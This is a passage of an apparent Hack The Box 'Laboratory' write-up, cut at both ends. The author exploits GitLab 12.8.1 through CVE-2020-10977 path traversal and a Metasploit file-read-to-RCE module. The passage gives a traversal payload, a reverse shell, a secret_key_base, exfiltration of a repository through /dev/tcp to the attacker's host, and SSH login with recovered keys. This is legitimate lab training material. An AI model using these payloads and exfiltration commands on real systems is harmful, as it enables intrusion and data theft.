</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---laboratoryhtb>TCP 80 - laboratory.htb<a class=anchor aria-hidden=true href=#tcp-80---laboratoryhtb>#</a></h3><p>There is nothing really interesting here.</p><p><div class=img-container><img src=imgs/9437ec2bf9834958a568bc836e4c625f.png alt=8337f36ab816a0b4af1bcff5b6d79ed8.png></div></p><h3 id=tcp-443---gitlaboratoryhtb>TCP 443 - git.laboratory.htb<a class=anchor aria-hidden=true href=#tcp-443---gitlaboratoryhtb>#</a></h3><p>A GitLab instance is presented on this page.</p><p><div class=img-container><img src=imgs/27df62df2abf49f8bea57f0e8bae36db.png alt=fe1e6f15f33117cf19d265d7bf02e1f0.png></div></p><p>I tried to register an account, but GitLab rejected it by saying the email domain was not authorized.</p><p><div class=img-container><img src=imgs/db1d849ef24942aaa0f08c2d16fc6b9b.png alt=9c894520b4a87fd3f31e567387c472be.png></div></p><p>I changed my email to <code>iamf@laboratory.htb</code> and it works.</p><p>The first thing I do is to check the GitLab version. It is available on the “Help” section and the current version is 12.8.1.</p><p><div class=img-container><img src=imgs/108726d7e7ed445cb6a38d1e080676f9.png alt=82ce9dcf1da9d53967aa746413c3efed.png></div></p><p>I found another user on this website named <code>Dexter McPherson</code>. This user has a project called <code>SecureWebsite</code></p><p><div class=img-container><img src=imgs/415abe033a4f4252ba3ac745473a9deb.png alt=9d2a20bf9637ad08d2615a4f44514ca1.png></div></p><h4 id=searchsploit>Searchsploit<a class=anchor aria-hidden=true href=#searchsploit>#</a></h4><p><code>searchsploit</code> shows several exploits for GitLab. One that stands out is an arbitrary file read vulnerability on version 12.9.0 which might work as well on version 12.8.1.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class=line><span class=cl>$ searchsploit gitlab
</span></span><span class=line><span class=cl>------------------------------------------------------------------------- -----------------------------
</span></span><span class=line><span class=cl>Exploit Title                                                           <span class=p>|</span>  Path
</span></span><span class=line><span class=cl>------------------------------------------------------------------------- -----------------------------
</span></span><span class=line><span class=cl>GitLab - <span class=s1>&#39;impersonate&#39;</span> Feature Privilege Escalation                      <span class=p>|</span> ruby/webapps/40236.txt
</span></span><span class=line><span class=cl>GitLab 11.4.7 - RCE <span class=o>(</span>Authenticated<span class=o>)</span> <span class=o>(</span>2<span class=o>)</span>                                  <span class=p>|</span> ruby/webapps/49334.py
</span></span><span class=line><span class=cl>GitLab 11.4.7 - Remote Code Execution <span class=o>(</span>Authenticated<span class=o>)</span> <span class=o>(</span>1<span class=o>)</span>                <span class=p>|</span> ruby/webapps/49257.py
</span></span><span class=line><span class=cl>GitLab 12.9.0 - Arbitrary File Read                                      <span class=p>|</span> ruby/webapps/48431.txt
</span></span><span class=line><span class=cl>Gitlab 12.9.0 - Arbitrary File Read <span class=o>(</span>Authenticated<span class=o>)</span>                      <span class=p>|</span> ruby/webapps/49076.py
</span></span><span class=line><span class=cl>Gitlab 6.0 - Persistent Cross-Site Scripting                             <span class=p>|</span> php/webapps/30329.sh
</span></span><span class=line><span class=cl>Gitlab-shell - Code Execution <span class=o>(</span>Metasploit<span class=o>)</span>                               <span class=p>|</span> linux/remote/34362.rb
</span></span><span class=line><span class=cl>Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting        <span class=p>|</span> java/webapps/47927.txt
</span></span><span class=line><span class=cl>NPMJS gitlabhook 0.0.17 - <span class=s1>&#39;repository&#39;</span> Remote Command Execution          <span class=p>|</span> json/webapps/47420.txt
</span></span><span class=line><span class=cl>------------------------------------------------------------------------- ------------------------------
</span></span></code></pre></div><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-git>Shell as git<a class=anchor aria-hidden=true href=#shell-as-git>#</a></h3><h4 id=gitlab-cve-2020-10977---manual>GitLab CVE-2020-10977 - Manual<a class=anchor aria-hidden=true href=#gitlab-cve-2020-10977---manual>#</a></h4><blockquote><p>CVE-2020-10977:
GitLab EE/CE 8.5 to 12.9 is vulnerable to a path traversal when moving an issue between projects.</p></blockquote><p>The arbitrary file read vulnerability is classified as CVE-2020–10977. The report can be found at <a href=https://hackerone.com/reports/827052>Hackerone</a>. The researcher also shows how that vulnerability can be turned into a remote code execution.</p><p>I&rsquo;ll reproduce the vulnerability by creating two projects. I&rsquo;ll name it as &ldquo;project1&rdquo; and &ldquo;project2&rdquo;.</p><p><div class=img-container><img src=imgs/image-20210422215749261.png alt=image-20210422215749261></div></p><p>After that I&rsquo;ll create an issue on &ldquo;project2&rdquo; and fill the issue description with a payload as follows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>![<span class=nt>a</span>](<span class=na>/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd</span>)
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210422220227988.png alt=image-20210422220227988></div></p><p>I&rsquo;ll then move the issue on &ldquo;project2&rdquo; to &ldquo;project1&rdquo;</p><p><div class=img-container><img src=imgs/image-20210422220401958.png alt=image-20210422220401958></div></p><p>The payload will then turn into an attached file.</p><p><div class=img-container><img src=imgs/image-20210422220539185.png alt=image-20210422220539185></div></p><p>The attached file contains the content of <code>/etc/passwd</code> file from the system.</p><p><div class=img-container><img src=imgs/image-20210422220624344.png alt=image-20210422220624344></div></p><h4 id=gitlab-cve-2020-10977---automated>GitLab CVE-2020-10977 - Automated<a class=anchor aria-hidden=true href=#gitlab-cve-2020-10977---automated>#</a></h4><p>There is also an <a href=https://github.com/thewhiteh4t/cve-2020-10977>automated version</a> to exploit this vulnerability written in Python.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class=line><span class=cl>$ python3 cve_2020_10977.py https://git.laboratory.htb/ iamf iamfiamf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Target        : https://git.laboratory.htb
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Username      : iamf
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Password      : iamfiamf
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Project Names : ProjectOne, ProjectTwo
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Trying to Login...
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Login Successful!
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Creating ProjectOne...
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> ProjectOne Created Successfully!
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Creating ProjectTwo...
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> ProjectTwo Created Successfully!
</span></span><span class=line><span class=cl><span class=o>[</span>&gt;<span class=o>]</span> Absolute Path to File : /etc/passwd
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Creating an Issue...
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Issue Created Successfully!
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Moving Issue...
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Issue Moved Successfully!
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> File URL : https://git.laboratory.htb/iamf/ProjectTwo/uploads/9335567cda468be5d53e6ddcca1412e4/passwd
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; /etc/passwd
</span></span><span class=line><span class=cl>----------------------------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>git:x:998:998::/var/opt/gitlab:/bin/sh
</span></span><span class=line><span class=cl>gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
</span></span><span class=line><span class=cl>gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
</span></span><span class=line><span class=cl>gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
</span></span><span class=line><span class=cl>mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
</span></span><span class=line><span class=cl>registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
</span></span><span class=line><span class=cl>gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
</span></span><span class=line><span class=cl>gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id=lfi-to-rce>LFI to RCE<a class=anchor aria-hidden=true href=#lfi-to-rce>#</a></h4><p>To turns this arbitrary file read vulnerability into a remote code execution, I’ll need to setup my own GitLab instance with the same version as the one on Laboratory. Then I’ll have to replace my GitLab <code>secret_key_base</code> with the one on Laboratory (located on <code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>). After that all is set, I&rsquo;ve to craft my own cookie to get the code execution on the system.</p><p>Fortunately, there is a Metasploit <a href=https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/>module</a> to perform this automatically, and I’ll use that.</p><p>First, I’ll have to grab the module from GitHub and put it into <code>/usr/share/metasploit-framework/modules/exploits/multi/http</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class=line><span class=cl>$ <span class=nb>cd</span> /usr/share/metasploit-framework/modules/exploits/multi/http <span class=o>&amp;&amp;</span> wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/gitlab_file_read_rce.rb
</span></span></code></pre></div><p>After that I’ll re-initialize the metasploit database using <code>msfdb</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «laboratory» «10.10.14.39»
</span></span><span class=line><span class=cl>$ msfdb reinit
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Starting database
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Dropping databases <span class=s1>&#39;msf&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Dropping databases <span class=s1>&#39;msf_test&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Dropping database user <span class=s1>&#39;msf&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Deleting configuration file /usr/share/metasploit-framework/config/database.yml
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Stopping database
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Starting database
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Creating database user <span class=s1>&#39;msf&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Creating databases <span class=s1>&#39;msf&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Creating databases <span class=s1>&#39;msf_test&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Creating configuration file <span class=s1>&#39;/usr/share/metasploit-framework/config/database.yml&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Creating initial database schema
</span></span></code></pre></div><p>Now on Metasploit, I can use the module by issuing the command below:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>msf6 &gt; use exploit/multi/http/gitlab_file_read_rce
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> No payload configured, defaulting to generic/shell_reverse_tcp
</span></span></code></pre></div><p>Below are the options needed by the module.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/gitlab_file_read_rce<span class=o>)</span> &gt; <span class=nb>set</span> USERNAME iamf
</span></span><span class=line><span class=cl><span class=nv>USERNAME</span> <span class=o>=</span>&gt; iamf
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/gitlab_file_read_rce<span class=o>)</span> &gt; <span class=nb>set</span> PASSWORD iamfiamf
</span></span><span class=line><span class=cl><span class=nv>PASSWORD</span> <span class=o>=</span>&gt; iamfiamf
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/gitlab_file_read_rce<span class=o>)</span> &gt; <span class=nb>set</span> RHOSTS 10.10.10.216
</span></span><span class=line><span class=cl><span class=nv>RHOSTS</span> <span class=o>=</span>&gt; 10.10.10.216
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/gitlab_file_read_rce<span class=o>)</span> &gt; <span class=nb>set</span> RPORT <span class=m>443</span>
</span></span><span class=line><span class=cl><span class=nv>RPORT</span> <span class=o>=</span>&gt; <span class=m>443</span>
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/gitlab_file_read_rce<span class=o>)</span> &gt; <span class=nb>set</span> SSL <span class=nb>true</span>
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Changing the SSL option’s value may require changing RPORT!
</span></span><span class=line><span class=cl><span class=nv>SSL</span> <span class=o>=</span>&gt; <span class=nb>true</span>
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/gitlab_file_read_rce<span class=o>)</span> &gt; <span class=nb>set</span> VHOST git.laboratory.htb
</span></span><span class=line><span class=cl><span class=nv>VHOST</span> <span class=o>=</span>&gt; git.laboratory.htb
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/gitlab_file_read_rce<span class=o>)</span> &gt; <span class=nb>set</span> LHOST tun0
</span></span><span class=line><span class=cl><span class=nv>LHOST</span> <span class=o>=</span>&gt; tun0
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/gitlab_file_read_rce<span class=o>)</span> &gt; <span class=nb>set</span> LPORT <span class=m>9001</span>
</span></span><span class=line><span class=cl><span class=nv>LPORT</span> <span class=o>=</span>&gt; <span class=m>9001</span>
</span></span></code></pre></div><p>After all the required options are set, I’ll start the exploit with the <code>run</code> command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/gitlab_file_read_rce<span class=o>)</span> &gt; run
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.10.14.39:9001 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Executing automatic check <span class=o>(</span>disable AutoCheck to override<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Logged in to user iamf
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Created project /iamf/hpt2TORA
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Created project /iamf/ysGE0u0L
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Created issue /iamf/hpt2TORA/issues/1
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Executing arbitrary file load
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> File saved as: <span class=s1>&#39;/root/.msf4/loot/20210321174611_default_10.10.10.216_gitlab.secrets_490542.txt&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file <span class=nb>read</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Attempting to delete project /iamf/hpt2TORA
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Deleted project /iamf/hpt2TORA
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Attempting to delete project /iamf/ysGE0u0L
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Deleted project /iamf/ysGE0u0L
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Command shell session <span class=m>1</span> opened <span class=o>(</span>10.10.14.39:9001 -&gt; 10.10.10.216:52726<span class=o>)</span> at 2021-03-21 17:46:14 -0400
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>id<span class=p>;</span>hostname
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>998<span class=o>(</span>git<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>998<span class=o>(</span>git<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>998<span class=o>(</span>git<span class=o>)</span>
</span></span><span class=line><span class=cl>git.laboratory.htb
</span></span></code></pre></div><p>I have shell as user <code>git</code>.</p><p>There is a <code>.dockerenv</code> file in the root directory, which indicates that I&rsquo;m inside a docker container.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>ls -la /
</span></span><span class=line><span class=cl>total <span class=m>88</span>
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root <span class=m>4096</span> Jul  <span class=m>2</span>  <span class=m>2020</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root <span class=m>4096</span> Jul  <span class=m>2</span>  <span class=m>2020</span> ..
</span></span><span class=line><span class=cl>-rwxr-xr-x   <span class=m>1</span> root root    <span class=m>0</span> Jul  <span class=m>2</span>  <span class=m>2020</span> .dockerenv
</span></span><span class=line><span class=cl>-rw-r--r--   <span class=m>1</span> root root  <span class=m>157</span> Feb <span class=m>24</span>  <span class=m>2020</span> RELEASE
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root <span class=m>4096</span> Feb <span class=m>24</span>  <span class=m>2020</span> assets
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-dexter>Shell as dexter<a class=anchor aria-hidden=true href=#shell-as-dexter>#</a></h3><h4 id=container-enumeration>Container enumeration<a class=anchor aria-hidden=true href=#container-enumeration>#</a></h4><p>Enumerating the <code>git</code> home directory (<code>/var/opt/gitlab</code>) discovers two repositories that belongs to user <code>dexter</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>git@git:~$ grep -Ri dexter 2&gt;/dev/null
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git/config:        <span class=nv>fullpath</span> <span class=o>=</span> dexter/securedocker
</span></span><span class=line><span class=cl>git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.git/config:        <span class=nv>fullpath</span> <span class=o>=</span> dexter/securewebsite
</span></span></code></pre></div><p>I haven&rsquo;t seen that <code>dexter/securedocker</code> before in the GitLab application. So I&rsquo;ll grab that repository and transfer it to my machine</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>git@git:~/git-data/repositories/@hashed/19/58$ ls -la 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
</span></span><span class=line><span class=cl>total <span class=m>40</span>
</span></span><span class=line><span class=cl>drwxr-s---  <span class=m>6</span> git root <span class=m>4096</span> Jul  <span class=m>5</span>  <span class=m>2020</span> .
</span></span><span class=line><span class=cl>drwxr-s---  <span class=m>4</span> git root <span class=m>4096</span> Jul  <span class=m>5</span>  <span class=m>2020</span> ..
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> git root   <span class=m>23</span> Jul  <span class=m>5</span>  <span class=m>2020</span> HEAD
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> git root  <span class=m>107</span> Jul  <span class=m>5</span>  <span class=m>2020</span> config
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> git root   <span class=m>73</span> Jul  <span class=m>5</span>  <span class=m>2020</span> description
</span></span><span class=line><span class=cl>drwxr-sr-x  <span class=m>2</span> git root <span class=m>4096</span> Jul  <span class=m>5</span>  <span class=m>2020</span> hooks
</span></span><span class=line><span class=cl>drwxr-sr-x  <span class=m>2</span> git root <span class=m>4096</span> Jul  <span class=m>5</span>  <span class=m>2020</span> info
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> git root  <span class=m>112</span> Jul  <span class=m>5</span>  <span class=m>2020</span> language-stats.cache
</span></span><span class=line><span class=cl>drwxr-sr-x <span class=m>14</span> git root <span class=m>4096</span> Jul  <span class=m>5</span>  <span class=m>2020</span> objects
</span></span><span class=line><span class=cl>drwxr-sr-x  <span class=m>4</span> git root <span class=m>4096</span> Jul  <span class=m>5</span>  <span class=m>2020</span> refs
</span></span></code></pre></div><p>First, I’ll create a tarball archive of that repository and I’ll name it as <code>exfil-securedocker-git.tar</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>git@git:~/git-data/repositories/@hashed/19/58/$ tar -czf /tmp/exfil-securedocker-git.tar 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
</span></span></code></pre></div><p>On my machine, I&rsquo;ll setup a listener</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «loot» «10.10.14.39»
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>9000</span> &gt; exfil-securedocker-git.tar
</span></span></code></pre></div><p>Back on Laboratory, I’ll send the repository tarball to my machine using <code>cat</code> and <code>bash</code> trick</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>git@git:~/git-data/repositories/@hashed/19/58/$ cat /tmp/exfil-securedocker-git.tar &gt; /dev/tcp/10.10.14.39/9000
</span></span></code></pre></div><p>My listener received the tarball.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «loot» «10.10.14.39»
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>9000</span> &gt; exfil-securedocker-git.tar
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>9000</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.39<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.216<span class=o>]</span> <span class=m>42426</span>
</span></span></code></pre></div><h4 id=recovering-securedocker-repository>Recovering &lsquo;securedocker&rsquo; repository<a class=anchor aria-hidden=true href=#recovering-securedocker-repository>#</a></h4><p>After extracting the repository, <code>git:(master)</code> popped up in my zsh prompt which indicates this is a git repository.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «loot» «10.10.14.39»
</span></span><span class=line><span class=cl>$ tar -xzf exfil-securedocker-git.tar
</span></span><span class=line><span class=cl>→ root@iamf «loot» «10.10.14.39»
</span></span><span class=line><span class=cl>$ <span class=nb>cd</span> 19581e27de7ced....5ef03f7c3017bb5b7.git
</span></span><span class=line><span class=cl>→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span class=o>(</span>master<span class=o>)</span>
</span></span><span class=line><span class=cl>$ 
</span></span></code></pre></div><p>But, when I try to read the repository status, it returns the following errors.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span class=o>(</span>master<span class=o>)</span>
</span></span><span class=line><span class=cl>$ git status
</span></span><span class=line><span class=cl>fatal: this operation must be run in a work tree
</span></span></code></pre></div><blockquote><p>I&rsquo;ve renamed <code>19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git</code> to <code>secure-docker.git</code>.</p></blockquote><p>This problem can be resolved by creating a new <code>.git</code> folder within <code>secure-docker.git</code> and transferring all the files from <code>secure-docker.git</code> to the newly created <code>.git</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class=o>(</span>master<span class=o>)</span>
</span></span><span class=line><span class=cl>$ mkdir .git
</span></span><span class=line><span class=cl>→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class=o>(</span>master<span class=o>)</span>
</span></span><span class=line><span class=cl>$ mv * .git
</span></span><span class=line><span class=cl>→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class=o>(</span>master<span class=o>)</span>
</span></span><span class=line><span class=cl>$ git status
</span></span><span class=line><span class=cl>fatal: this operation must be run in a work tree
</span></span></code></pre></div><p>Finally, use the <code>git init</code> command to re-initialize the git repository.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class=o>(</span>master<span class=o>)</span>
</span></span><span class=line><span class=cl>$ git init
</span></span><span class=line><span class=cl>Reinitialized existing Git repository in /root/htb/to-do/laboratory/loot/secure-docker.git/.git/
</span></span><span class=line><span class=cl>→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class=o>(</span>master<span class=o>)</span> ✗
</span></span><span class=line><span class=cl>$ git status
</span></span><span class=line><span class=cl>On branch master
</span></span><span class=line><span class=cl>Changes to be committed:
</span></span><span class=line><span class=cl>  <span class=o>(</span>use <span class=s2>&#34;git restore --staged &lt;file&gt;...&#34;</span> to unstage<span class=o>)</span>
</span></span><span class=line><span class=cl>        deleted:    README.md
</span></span><span class=line><span class=cl>        deleted:    create_gitlab.sh
</span></span><span class=line><span class=cl>        deleted:    dexter/.ssh/authorized_keys
</span></span><span class=line><span class=cl>        deleted:    dexter/.ssh/id_rsa
</span></span><span class=line><span class=cl>        deleted:    dexter/recipe.url
</span></span><span class=line><span class=cl>        deleted:    dexter/todo.txt
</span></span></code></pre></div><p>This repository contains a set of SSH keys that have been deleted. I can restore these with <code>git checkout --</code> command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class=o>(</span>master<span class=o>)</span> ✗
</span></span><span class=line><span class=cl>$ git checkout --
</span></span><span class=line><span class=cl>→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class=o>(</span>master<span class=o>)</span> ✗
</span></span><span class=line><span class=cl>$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>20</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> root root <span class=m>4096</span> Mar <span class=m>22</span> 09:36 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> root root <span class=m>4096</span> Mar <span class=m>22</span> 09:36 ..
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root  <span class=m>102</span> Mar <span class=m>22</span> 09:36 recipe.url
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> root root <span class=m>4096</span> Mar <span class=m>22</span> 09:36 .ssh
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root  <span class=m>160</span> Mar <span class=m>22</span> 09:36 todo.txt
</span></span></code></pre></div><h4 id=ssh---dexter>SSH - dexter<a class=anchor aria-hidden=true href=#ssh---dexter>#</a></h4><p>I can now login as <code>dexter</code> using the SSH key I obtained.</p><p>At first try, it says the key is invalid format, but this can be fixed wit by adding an empty string (newline) using the <code>echo</code> command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class=o>(</span>master<span class=o>)</span> ✗
</span></span><span class=line><span class=cl>$ chmod <span class=m>600</span> dexter/.ssh/id_rsa
</span></span><span class=line><span class=cl>→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class=o>(</span>master<span class=o>)</span> ✗
</span></span><span class=line><span class=cl>$ ssh -i dexter/.ssh/id_rsa dexter@10.10.10.216
</span></span><span class=line><span class=cl>Load key <span class=s2>&#34;id_rsa&#34;</span>: invalid format
</span></span><span class=line><span class=cl>dexter@10.10.10.216: Permission denied <span class=o>(</span>publickey<span class=o>)</span>.
</span></span><span class=line><span class=cl>→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class=o>(</span>master<span class=o>)</span> ✗
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;&#39;</span> &gt;&gt; dexter/.ssh/id_rsa
</span></span></code></pre></div><p>Now it logs me in.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class=o>(</span>master<span class=o>)</span> ✗
</span></span><span class=line><span class=cl>$ ssh -i id_rsa dexter@10.10.10.216
